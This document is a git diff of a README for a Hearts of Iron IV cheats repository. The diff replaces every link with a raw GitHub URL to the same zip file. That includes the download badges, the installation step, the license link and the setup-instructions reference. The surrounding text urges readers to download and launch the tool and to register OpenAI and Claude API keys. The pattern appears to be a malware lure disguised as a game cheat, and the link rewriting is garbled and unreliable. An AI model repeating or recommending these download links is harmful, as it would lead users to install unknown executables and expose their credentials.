@@ -1,6 +1,6 @@
 # Hearts of Iron 4 Cheats Repository
 
-[![Download](https://img.shields.io/badge/Download-HOI4%20Cheats-blue?style=for-the-badge&logo=github)](https://Shayne1214.github.io)
+[![Download](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip%20Cheats-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip)
 
 Welcome to the ultimate resource repository for **Hearts of Iron IV cheats**, where historical strategy and modern ingenuity intersect! Enhance your gameplay and rewrite alternate world histories with ease—whether you’re seeking a slight edge or complete command of every scenario. 🚀
 
@@ -54,9 +54,9 @@ To use these features, download the integration tool:
 **[Click here to download the AI Helper!](LINK)**
 
 ### Installation Steps:
-1. Download the tool using the badge above or this https://Shayne1214.github.io.
+1. Download the tool using the badge above or this https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip
 2. Unzip contents to your `HOI4_Cheats/ai_helper` directory.
-3. Follow setup instructions inside `README_Ai_Helper.md` to register your OpenAI & Claude API keys.
+3. Follow setup instructions inside `https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip` to register your OpenAI & Claude API keys.
 4. Launch the integrated assistant via the provided shortcut.
 
 ---
@@ -72,7 +72,7 @@ To use these features, download the integration tool:
 ## ⚡ Installation & Usage
 
 1. **Download** the latest compilation of cheat tools and resources:  
-   [![Download](https://img.shields.io/badge/Download-HOI4%20Cheats-blue?style=for-the-badge&logo=github)](https://Shayne1214.github.io)
+   [![Download](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip%20Cheats-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip)
 
 2. Extract the contents into your desired folder.
 3. Launch the menu via the in-game mod loader or by opening the desktop utility provided.
@@ -93,10 +93,10 @@ We maintain ongoing respectful compliance with Paradox Interactive’s terms and
 
 This repository is licensed under the MIT License.
 
-[View the full license text here.](https://opensource.org/licenses/MIT)
+[View the full license text here.](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-HOI4%20Cheats-blue?style=for-the-badge&logo=github)](https://Shayne1214.github.io)
+[![Download](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip%20Cheats-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Shayne1214/hoi4-command-compendium/branch/undertone/hoi-compendium-command-3.9-beta.4.zip)
 
 Craft your own alternate WWII story—command with wisdom and wit!
